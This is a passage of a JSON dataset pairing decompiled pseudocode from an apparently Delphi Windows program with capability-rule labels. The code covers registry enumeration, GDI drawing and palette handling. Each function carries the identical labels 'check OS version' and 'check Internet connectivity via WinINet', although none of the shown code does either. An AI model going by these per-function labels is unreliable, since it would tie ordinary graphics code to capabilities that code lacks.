        "decompiled_code": "\nuint32_t __fastcall fcn.004215e4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    fcn.00403aac();\n    uVar1 = sub.advapi32.dll_RegQueryInfoKeyA\n                      (*(in_EAX + 4), 0, 0, 0, param_2, param_2 + 4, 0, param_2 + 8, param_2 + 0xc, param_2 + 0x10, 0, \n                       param_2 + 0x14);\n    if ((*(*0x492b04 + 0xc) != '\\0') && (**0x492aec == 2)) {\n        *(param_2 + 4) = *(param_2 + 4) + *(param_2 + 4);\n        *(param_2 + 0xc) = *(param_2 + 0xc) + *(param_2 + 0xc);\n    }\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 244
    },
    "00421998": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00421998(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_10h;\n    int32_t var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    cVar1 = fcn.004217dc();\n    if (cVar1 == '\\0') {\n        var_ch = 0;\n    }\n    else if (((var_10h == '\\x04') || (var_10h == '\\0')) && (var_ch <= arg_8h)) {\n        fcn.00421a64(&var_5h, var_ch);\n    }\n    else {\n        fcn.00420ea0();\n    }\n    return var_ch;\n}\n",
        "token_count": 171
    },
    "00421e40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421e40(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uchar *puStack156;\n    uint uStack152;\n    uint uStack148;\n    uchar *puStack144;\n    int32_t iStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t dwIndex;\n    int32_t var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_50h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    var_4h = 0;\n    uStack92 = 0x422081;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    var_18h = *(*(arg_8h + -4) + 4);\n    puStack100 = 0x421e82;\n    hKey = in_EAX;\n    fcn.00421078();\n    uStack104 = 0x422057;\n    uStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    uStack112 = 0x421e9e;\n    puStack100 = &stack0xfffffffc;\n    cVar1 = fcn.004215e4();\n    if (cVar1 != '\\0') {\n        uStack112 = 0x421eb4;\n        fcn.0040555c();\n        if (-1 < var_44h + -1) {\n            var_28h = var_44h;\n            dwIndex = 0;\n            do {\n                var_10h = var_40h + 1;\n                uStack112 = 0;\n                uStack116 = 0;\n                uStack120 = 0;\n                uStack124 = 0;\n                puStack128 = &fcn.00421e40::var_10h;\n                uStack132 = 0x421ee6;\n                uStack132 = fcn.004058fc();\n                iStack136 = dwIndex;\n                uStack108 = hKey;\n                puStack144 = 0x421ef4;\n                iVar2 = sub.advapi32.dll_RegEnumKeyExA();\n                if (iVar2 == 0) {\n                    puStack144 = 0x421f04;\n                    fcn.004058fc();\n                    puStack144 = 0x421f0e;\n                    fcn.00405664();\n                    puStack144 = 0x421f1c;\n                    var_20h = fcn.00421ae8();\n                    if (var_20h != 0) {\n                        uStack148 = 0x422028;\n                        uStack152 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff68;\n                        var_1ch = *(*(arg_8h + -4) + 4);\n                        puStack156 = 0x421f51;\n                        puStack144 = &stack0xfffffffc;\n                        fcn.00421078();\n                        uStack160 = 0x42200a;\n                        uStack164 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff5c;\n                        puStack168 = 0x421f67;\n                        puStack156 = &stack0xfffffffc;\n                        fcn.004058fc();\n                        puStack168 = 0x421f71;\n                        fcn.00405664();\n                        puStack168 = 0x421f7f;\n                        fcn.0042107c();\n                        puStack168 = 0x421f87;\n                        fcn.004058fc();\n                        puStack168 = 0x421f91;\n                        fcn.00405664();\n                        puStack168 = 0x421f9f;\n                        var_24h = fcn.00421ae8();\n                        uStack172 = 0x421fe7;\n                        uStack176 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff50;\n                        puStack168 = &stack0xfffffffc;\n                        fcn.00421d18(arg_8h);\n                        fcn.00421e40(arg_8h);\n                        *in_FS_OFFSET = uStack176;\n                        puStack168 = 0x421fee;\n                        uStack172 = var_24h;\n                        uStack176 = 0x421fe6;\n                        sub.advapi32.dll_RegCloseKey_1();\n                        return;\n                    }\n                }\n                dwIndex = dwIndex + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack108;\n    puStack100 = 0x42205e;\n    uStack104 = 0x422056;\n    fcn.00421078();\n    return;\n}\n",
        "token_count": 1262
    },
    "0042208c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042208c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    int32_t iStack44;\n    uchar *puStack40;\n    uint uStack36;\n    int32_t iStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4220a5;\n    cVar1 = fcn.00421b80();\n    if (cVar1 != '\\0') {\n        puStack28 = 0x4220b7;\n        cVar1 = fcn.00421b80();\n        if (cVar1 == '\\0') {\n            puStack28 = 0x4220c9;\n            iVar2 = fcn.00421ae8();\n            if (iVar2 != 0) {\n                iStack32 = 0x42216e;\n                uStack36 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffdc;\n                puStack40 = 0x4220ee;\n                puStack28 = &stack0xfffffffc;\n                fcn.0042107c();\n                puStack40 = 0x4220f8;\n                iVar3 = fcn.00421ae8();\n                if (iVar3 != 0) {\n                    iStack44 = 0x422150;\n                    uStack48 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffd0;\n                    puStack40 = &stack0xfffffffc;\n                    fcn.00421d18(&stack0xfffffffc);\n                    fcn.00421e40(&stack0xfffffffc);\n                    if (arg_8h != '\\0') {\n                        fcn.0042144c();\n                    }\n                    *in_FS_OFFSET = uStack48;\n                    puStack40 = 0x422157;\n                    uStack48 = 0x42214f;\n                    iStack44 = iVar3;\n                    sub.advapi32.dll_RegCloseKey_1();\n                    return;\n                }\n                *in_FS_OFFSET = uStack36;\n                puStack28 = 0x422175;\n                uStack36 = 0x42216d;\n                iStack32 = iVar2;\n                sub.advapi32.dll_RegCloseKey_1();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 537
    },
    "004232a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004232a8(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4232c3;\n    iVar2 = fcn.0042321c();\n    puStack24 = 0x4232cd;\n    fcn.00423290();\n    uStack28 = 0x42337c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (var_8h = *(in_EAX + 4); var_8h != NULL; var_8h = *var_8h) {\n        if (iVar2 == *(var_8h + 3)) {\n            cVar1 = fcn.004098cc();\n            if (cVar1 != '\\0') break;\n        }\n    }\n    if (var_8h == NULL) {\n        var_8h = fcn.00402ef0();\n        *var_8h = *(in_EAX + 4);\n        var_8h[1] = 0;\n        var_8h[2] = *param_2;\n        *(var_8h + 3) = iVar2;\n        fcn.004030ec();\n        *(in_EAX + 4) = var_8h;\n    }\n    var_8h[1] = var_8h[1] + 1;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x423383;\n    uStack28 = 0x42337b;\n    fcn.0042329c();\n    return;\n}\n",
        "token_count": 427
    },
    "0042338c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042338c(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 == NULL) {\n        return;\n    }\n    uStack28 = 0x4233b1;\n    fcn.00423290();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    param_2[1] = param_2[1] + -1;\n    if (param_2[1] == 0) {\n        puVar1 = *(in_EAX + 4);\n        if (*(in_EAX + 4) == param_2) {\n            *(in_EAX + 4) = *param_2;\n        }\n        else {\n            do {\n                puVar2 = puVar1;\n                puVar1 = *puVar2;\n            } while (puVar1 != param_2);\n            *puVar2 = *param_2;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x42341b;\n    uStack32 = 0x423413;\n    fcn.0042329c();\n    return;\n}\n",
        "token_count": 326
    },
    "00423548": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00423548(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42355a;\n    fcn.00423290();\n    uStack28 = 0x4235a8;\n    iVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (puVar2 = *(in_EAX + 4); puVar2 != NULL; puVar2 = *puVar2) {\n        iStack32 = puVar2[2];\n        if ((iStack32 != 0) && (puVar2[5] < 0)) {\n            sub.gdi32.dll_DeleteObject();\n            puVar2[2] = 0;\n            iVar1 = iStack32;\n        }\n        iStack32 = iVar1;\n        iVar1 = iStack32;\n    }\n    *in_FS_OFFSET = iVar1;\n    puStack24 = 0x4235af;\n    uStack28 = 0x4235a7;\n    iStack32 = iVar1;\n    fcn.0042329c();\n    return;\n}\n",
        "token_count": 305
    },
    "00423ad4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00423ad4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 10) != 0) {\n        (**(in_EAX + 8))();\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00424574": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00424574(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack28 = 0x424593;\n        fcn.00423290();\n        uStack32 = 0x4245fa;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_14h = *(*(var_4h + 0x1c) * 2 + 0x490dd8);\n            var_10h = *(var_4h + 0x18);\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00423aa4();\n            puStack40 = &fcn.00424574::var_14h;\n            uVar1 = sub.gdi32.dll_CreatePenIndirect();\n            *(var_4h + 8) = uVar1;\n        }\n        *in_FS_OFFSET = puStack40;\n        uStack32 = 0x424601;\n        iStack36 = 0x4245f9;\n        uVar1 = fcn.0042329c();\n        return uVar1;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 395
    },
    "00424860": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00424860(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack24 = 0x424883;\n        fcn.00423290();\n        uStack28 = 0x42492e;\n        puStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        if (*(var_4h + 8) == 0) {\n            if (*(var_4h + 0x18) == NULL) {\n                var_8h = 0;\n                uVar1 = *(var_4h + 0x1c);\n                if (uVar1 == 0) {\n                    var_10h = 0;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else if (uVar1 == 1) {\n                    var_10h = 1;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else {\n                    var_10h = 2;\n                    var_8h = (uVar1 & 0x7f) - 2;\n                    puStack24 = &stack0xfffffffc;\n                }\n            }\n            else {\n                var_10h = 3;\n                puStack24 = &stack0xfffffffc;\n                (**(**(var_4h + 0x18) + 0x70))();\n                var_8h = (**(**(var_4h + 0x18) + 0x68))();\n            }\n            var_ch = fcn.00423aa4();\n            puStack32 = &fcn.00424860::var_10h;\n            uVar2 = sub.gdi32.dll_CreateBrushIndirect();\n            *(var_4h + 8) = uVar2;\n        }\n        *in_FS_OFFSET = puStack32;\n        puStack24 = 0x424935;\n        uStack28 = 0x42492d;\n        uVar2 = fcn.0042329c();\n        return uVar2;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 552
    },
    "00424d58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00424d58(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_1h;\n    \n    uStack16 = 0x497a2c;\n    puStack20 = 0x424d69;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x424da4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x50) == 0) {\n        puStack20 = &fcn.00424d58::var_1h + 1;\n        fcn.00424c44();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x424dab;\n    uStack24 = 0x497a2c;\n    uStack28 = 0x424da3;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 253
    },
    "004252d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004252d4(char param_1, uint *param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff44;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint lpvObject;\n    uint var_30h;\n    uint var_2ch;\n    uint hdcDest;\n    int32_t var_18h;\n    int32_t hdc;\n    int32_t var_10h;\n    uint nWidth;\n    uint nHeight;\n    uint hgdiobj;\n    \n    nWidth = *param_2;\n    nHeight = param_2[1];\n    uStack72 = 0;\n    uStack76 = 0x4252f0;\n    hgdiobj = in_EAX;\n    var_18h = sub.gdi32.dll_CreateCompatibleDC();\n    uStack76 = 0;\n    puStack80 = 0x4252fa;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    uStack84 = 0x425422;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = &fcn.004252d4::lpvObject;\n    uStack96 = 0x18;\n    uStack100 = hgdiobj;\n    uStack104 = 0x42531a;\n    puStack80 = &stack0xfffffffc;\n    sub.gdi32.dll_GetObjectA();\n    if (param_1 != '\\0') {\n        uStack104 = 0;\n        puStack108 = 0x1;\n        uStack112 = 1;\n        iStack116 = nHeight;\n        var_10h = sub.gdi32.dll_CreateBitmap(nWidth);\n        if (var_10h != 0) {\n            iVar1 = sub.gdi32.dll_SelectObject(var_18h, hgdiobj);\n            iVar2 = sub.gdi32.dll_SelectObject(hdcDest, var_10h);\n            sub.gdi32.dll_StretchBlt(hdcDest, 0, 0, nWidth, nHeight, var_18h, 0, 0, var_30h, var_2ch, 0xcc0020);\n            if (iVar1 != 0) {\n                in_stack_ffffff44 = var_18h;\n                sub.gdi32.dll_SelectObject(var_18h, iVar1);\n            }\n            if (iVar2 != 0) {\n                sub.gdi32.dll_SelectObject(hdcDest, iVar2);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffff44;\n        sub.gdi32.dll_DeleteDC(var_18h, 0x425429);\n        sub.gdi32.dll_DeleteDC(hdcDest);\n        return;\n    }\n    uStack104 = 0;\n    puStack108 = 0x42533d;\n    hdc = sub.user32.dll_GetDC();\n    if (hdc == 0) {\n        puStack108 = 0x42534b;\n        fcn.0042521c();\n    }\n    uStack112 = 0x425391;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    iVar1 = hdc;\n    puStack108 = &stack0xfffffffc;\n    var_10h = sub.gdi32.dll_CreateCompatibleBitmap(hdc, nWidth, nHeight);\n    if (var_10h == 0) {\n        fcn.0042521c();\n    }\n    *in_FS_OFFSET = iVar1;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x425398);\n    return;\n}\n",
        "token_count": 876
    },
    "00425474": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00425474(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint hdc, int32_t arg_28h, int32_t arg_2ch)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    int32_t hpal;\n    uint var_20h;\n    uint crColor;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint nYOriginDest;\n    uint nXOriginDest;\n    \n    if (((**0x492aec == 2) && (arg_18h == arg_2ch)) && (arg_14h == arg_28h)) {\n        uStack56 = 1;\n        puStack60 = 0x1;\n        uStack64 = hdc;\n        uStack68 = 0x4254bc;\n        sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack68 = 0x4254c1;\n        uStack68 = fcn.004252c4();\n        iStack72 = arg_10h;\n        puStack76 = 0x4254d1;\n        uVar1 = sub.gdi32.dll_SelectObject();\n        uStack80 = 0x42553c;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        uVar5 = 0xccaa0029;\n        uVar2 = uVar1;\n        puStack76 = &stack0xfffffffc;\n        sub.gdi32.dll_MaskBlt();\n        *in_FS_OFFSET = in_EAX;\n        uVar2 = sub.gdi32.dll_SelectObject\n                          (arg_10h, uVar1, 0x4256f0, arg_2ch, arg_28h, hdc, arg_20h, arg_1ch, uVar2, arg_ch, arg_8h, \n                           uVar5);\n        sub.gdi32.dll_DeleteObject(uVar2);\n        return;\n    }\n    uStack56 = 0;\n    puStack60 = 0x42554f;\n    sub.gdi32.dll_CreateCompatibleDC();\n    puStack60 = 0x425554;\n    uVar2 = fcn.004252c4();\n    uStack64 = 0x4256e9;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    iStack72 = arg_14h;\n    puStack76 = arg_18h;\n    uStack80 = hdc;\n    uStack84 = 0x425570;\n    puStack60 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack84 = 0x425575;\n    uVar1 = fcn.004252c4();\n    uStack84 = uVar1;\n    iVar3 = sub.gdi32.dll_SelectObject(uVar2);\n    iVar4 = sub.gdi32.dll_SelectPalette(hdc, *0x4979f8, 0);\n    sub.gdi32.dll_SelectPalette(hdc, iVar4, 0);\n    if (iVar4 == 0) {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, *0x4979f8, 0xffffffff);\n    }\n    else {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, iVar4, 0xffffffff);\n    }\n    sub.gdi32.dll_RealizePalette(uVar2);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, arg_10h, arg_ch, arg_8h, arg_18h, arg_14h, 0xcc0020);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, hdc, arg_20h, arg_1ch, arg_18h, arg_14h, 0x440328);\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    if (iVar3 != 0) {\n        sub.gdi32.dll_SelectObject(uVar2, iVar3);\n    }\n    sub.gdi32.dll_DeleteObject();\n    *in_FS_OFFSET = uVar1;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar2, hpal, 0, 0x4256f0);\n    }\n    sub.gdi32.dll_DeleteDC(uVar2);\n    return;\n}\n",
        "token_count": 1141
    },
    "00425924": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00425924(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffb8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hdc;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if (*0x4979f8 != 0) {\n        uStack20 = 0;\n        puStack24 = 0x425941;\n        uVar1 = sub.user32.dll_GetDC();\n        uStack28 = 0x4259aa;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &fcn.00425924::var_1h + 1;\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar1, 0x68);\n        if (0xf < iVar2) {\n            sub.gdi32.dll_GetPaletteEntries(*0x4979f8, 0, 8, in_EAX + 4);\n            in_stack_ffffffb8 = *0x4979f8;\n            sub.gdi32.dll_GetPaletteEntries(*0x4979f8, 8, 8, in_EAX + -0x1c + *(in_EAX + 2) * 4);\n            var_1h._0_1_ = 1;\n        }\n        *in_FS_OFFSET = in_stack_ffffffb8;\n        uVar1 = sub.user32.dll_ReleaseDC(0, uVar1, 0x4259b1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 422
    },
    "004259bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004259bc(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack1080;\n    uint32_t uStack1076;\n    uint uStack1072;\n    uint32_t uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uchar *puStack1056;\n    uint32_t uStack1052;\n    uint uStack1048;\n    uint uStack1044;\n    ushort uStack1040;\n    \n    uStack1040 = 0x300;\n    if (in_EAX == 0) {\n        uStack1044 = 0x425a1f;\n        fcn.004030ec();\n    }\n    else {\n        uStack1044 = 0;\n        uStack1048 = 0x4259da;\n        uVar3 = sub.gdi32.dll_CreateCompatibleDC();\n        puStack1056 = 0x4259e3;\n        uStack1052 = uVar3;\n        uVar4 = sub.gdi32.dll_SelectObject();\n        puStack1056 = &stack0xfffffbe8;\n        uStack1060 = 0x100;\n        uStack1064 = 0;\n        uStack1072 = 0x4259f7;\n        uStack1068 = uVar3;\n        uVar2 = sub.gdi32.dll_GetDIBColorTable();\n        uStack1068 = uStack1068 & 0xffff | uVar2 << 0x10;\n        uStack1080 = 0x425a03;\n        uStack1076 = uVar3;\n        uStack1072 = uVar4;\n        sub.gdi32.dll_SelectObject();\n        uStack1080 = uVar3;\n        sub.gdi32.dll_DeleteDC();\n    }\n    if (uStack1080._2_2_ != 0) {\n        if ((uStack1080._2_2_ != 0x10) || (cVar1 = fcn.00425924(),  cVar1 == '\\0')) {\n            fcn.004257b8();\n        }\n        uVar4 = sub.gdi32.dll_CreatePalette(&stack0xfffffbc8);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 526
    },
    "00425a60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00425a60(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack44;\n    \n    if (((in_EAX != 0) && (iVar1 = sub.gdi32.dll_GetObjectA(),  iVar1 != 0)) && (in_EAX != 0)) {\n        sub.gdi32.dll_GetPaletteEntries();\n        fcn.004257b8();\n        iStack44 = in_EAX;\n    }\n    return CONCAT44(iStack44, iStack44);\n}\n",
        "token_count": 120
    },
    "00425ab4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
